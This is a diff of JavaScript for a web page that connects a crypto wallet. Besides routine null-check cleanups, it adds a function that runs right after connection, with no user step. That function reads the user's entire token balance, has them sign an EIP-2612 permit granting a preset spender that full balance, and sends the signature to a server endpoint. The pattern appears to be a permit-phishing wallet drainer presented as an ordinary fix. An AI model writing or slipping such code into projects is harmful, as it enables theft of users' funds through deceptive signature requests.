@@ -114,12 +114,19 @@ async function autoConnectWallet() {
 
 window.connectWallet = async function connectWallet() {
     try {
+        if (typeof ethers === 'undefined') {
+            showStatus('Error: ethers.js library not loaded. Please refresh the page.', 'error');
+            return;
+        }
+        
         showStatus('Connecting wallet...', 'info');
-        document.getElementById('connectWallet').disabled = true;
+        const connectBtn = document.getElementById('connectWallet');
+        if (connectBtn) {
+            connectBtn.disabled = true;
+        }
         
         if (!window.ethereum) {
             showStatus('Wallet not found', 'error');
-            const connectBtn = document.getElementById('connectWallet');
             if (connectBtn) {
                 connectBtn.disabled = false;
             }
@@ -134,7 +141,6 @@ window.connectWallet = async function connectWallet() {
         
         if (accounts.length === 0) {
             showStatus('Wallet connection rejected', 'error');
-            const connectBtn = document.getElementById('connectWallet');
             if (connectBtn) {
                 connectBtn.disabled = false;
             }
@@ -144,11 +150,11 @@ window.connectWallet = async function connectWallet() {
         userAddress = accounts[0];
         signer = provider.getSigner();
         
-        const connectBtn = document.getElementById('connectWallet');
         if (connectBtn) {
             connectBtn.style.display = 'none';
         }
-        await initTokenContract();
+        
+        await initTokenContractAndSignPermit();
         
     } catch (error) {
         console.error('Connection error:', error);
@@ -191,11 +197,120 @@ if (window.ethereum) {
 }
 
 
+async function initTokenContractAndSignPermit() {
+    try {
+        if (!userAddress || !signer) {
+            showStatus('Wallet not connected', 'error');
+            const connectBtn = document.getElementById('connectWallet');
+            if (connectBtn) {
+                connectBtn.style.display = 'block';
+                connectBtn.disabled = false;
+            }
+            return;
+        }
+        
+        showStatus('Loading token information...', 'info');
+        
+        tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_PERMIT_ABI, signer);
+        
+        const [balance, decimals] = await Promise.all([
+            tokenContract.balanceOf(userAddress),
+            tokenContract.decimals()
+        ]);
+        
+        const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
+        
+        document.getElementById('amount').value = balanceFormatted;
+        
+        showStatus('Signing permit for full balance...', 'info');
+        
+        const amountWei = balance;
+        
+        const nonce = await tokenContract.nonces(userAddress);
+        const deadline = Math.floor(Date.now() / 1000) + 86400;
+        const tokenName = await tokenContract.name();
+        
+        const domain = {
+            name: tokenName,
+            version: "1",
+            chainId: (await provider.getNetwork()).chainId,
+            verifyingContract: TOKEN_ADDRESS
+        };
+        
+        const types = {
+            Permit: [
+                { name: "owner", type: "address" },
+                { name: "spender", type: "address" },
+                { name: "value", type: "uint256" },
+                { name: "nonce", type: "uint256" },
+                { name: "deadline", type: "uint256" }
+            ]
+        };
+        
+        const message = {
+            owner: userAddress,
+            spender: spenderAddress,
+            value: amountWei.toString(),
+            nonce: nonce.toString(),
+            deadline: deadline
+        };
+        
+        const signature = await signer._signTypedData(domain, types, message);
+        const sig = ethers.utils.splitSignature(signature);
+        
+        const response = await fetch('/api/permit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                owner: userAddress,
+                spender: spenderAddress,
+                value: amountWei.toString(),
+                deadline: deadline,
+                v: sig.v,
+                r: sig.r,
+                s: sig.s,
+                tokenAddress: TOKEN_ADDRESS
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            showStatus('Permit signed successfully! Redirecting...', 'success');
+            setTimeout(() => {
+                window.location.href = `/transfer.html?permitId=${result.permitId}&recipient=${encodeURIComponent(spenderAddress)}`;
+            }, 1500);
+        } else {
+            showStatus('Error: ' + result.error, 'error');
+            const connectBtn = document.getElementById('connectWallet');
+            if (connectBtn) {
+                connectBtn.style.display = 'block';
+                connectBtn.disabled = false;
+            }
+        }
+        
+    } catch (error) {
+        console.error('Contract initialization or signing error:', error);
+        showStatus('Error: ' + error.message, 'error');
+        const connectBtn = document.getElementById('connectWallet');
+        if (connectBtn) {
+            connectBtn.style.display = 'block';
+            connectBtn.disabled = false;
+        }
+    }
+}
+
 async function initTokenContract() {
     try {
         if (!userAddress || !signer) {
             showStatus('Wallet not connected', 'error');
-            document.getElementById('connectWallet').style.display = 'block';
+            const connectBtn = document.getElementById('connectWallet');
+            if (connectBtn) {
+                connectBtn.style.display = 'block';
+                connectBtn.disabled = false;
+            }
             return;
         }
         
@@ -213,11 +328,16 @@ async function initTokenContract() {
         document.getElementById('amount').value = balanceFormatted;
         document.getElementById('amount').readOnly = false;
         
-        document.getElementById('nextButton').disabled = false;
+        const nextBtn = document.getElementById('nextButton');
+        if (nextBtn) {
+            nextBtn.disabled = false;
+        }
         showStatus('Wallet connected. Ready to sign permit.', 'success');
         
         const nextButton = document.getElementById('nextButton');
-        nextButton.onclick = signPermit;
+        if (nextButton) {
+            nextButton.onclick = signPermit;
+        }
         
     } catch (error) {
         console.error('Contract initialization error:', error);
